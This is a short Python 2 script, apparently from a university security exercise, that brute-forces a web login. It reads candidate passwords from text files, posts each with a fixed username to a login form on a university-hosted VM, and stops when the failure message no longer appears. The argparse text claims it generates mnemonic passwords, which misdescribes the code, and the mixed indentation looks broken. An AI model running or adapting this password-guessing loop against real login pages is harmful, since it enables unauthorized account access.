import re
import os
import sys
import string
from itertools import product
from argparse import ArgumentParser
import requests

user = 'amw'
url = 'http://normandy-vm-04.cs.unc.edu/download.php'
print 'simple mode begins for', user

if __name__ == "__main__":
  parser = ArgumentParser(description="""Generate mnemonic passwords from text.""")

  parser.add_argument("input_filename", nargs="+", \
    help="input text files")

  args = parser.parse_args()

  s = requests.Session()
  count = 0


  for filename in args.input_filename:

    # open file
    with open(filename) as f:

      # iterate through file line-by-line
      for line in f:
        line = line.strip() # remove whitespace from ends

	password =  line

        if len(password ) < 1:
          continue



	r = None
	pair = {'user':user, 'pass':password, 'login':'Login'}
	r = s.post(url, data = pair)

	if r is not None:
		resp = r.text
		count += 1
		if count%100 == 0:
			print count,' has tried'

		if 'Invalid username and/or password!' not in resp:
			print 'password FOUND!',  password
			exit(0)







##################################################################################

	
print 'nothing matches'
